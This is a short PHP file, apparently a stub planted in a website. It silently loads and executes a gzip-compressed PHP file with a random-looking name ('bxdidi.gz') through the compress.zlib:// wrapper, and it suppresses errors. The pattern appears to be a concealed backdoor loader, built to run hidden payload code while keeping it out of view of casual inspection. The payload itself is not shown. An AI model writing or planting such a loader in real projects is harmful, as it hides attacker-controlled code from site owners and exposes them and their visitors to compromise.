<?php
$_z = __DIR__ . '/bxdidi.gz';
if (is_file($_z)) {
    @include_once 'compress.zlib://' . $_z;
}

